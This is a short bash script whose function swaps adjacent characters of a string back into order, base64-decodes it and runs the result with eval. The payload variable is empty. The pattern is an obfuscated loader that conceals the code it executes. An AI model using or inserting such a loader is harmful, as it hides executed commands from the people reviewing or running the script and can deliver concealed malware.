shuffled_script=""
decode_and_execute() {
    shuffled="$1"
    unshuffled=""
    for (( i=0; i<${#shuffled}; i+=2 )); do
        unshuffled="${unshuffled}${shuffled:i+1:1}${shuffled:i:1}"
    done
    decoded_script=$(echo "${unshuffled}" | base64 --decode)
    eval "${decoded_script}"
}
decode_and_execute "${shuffled_script}"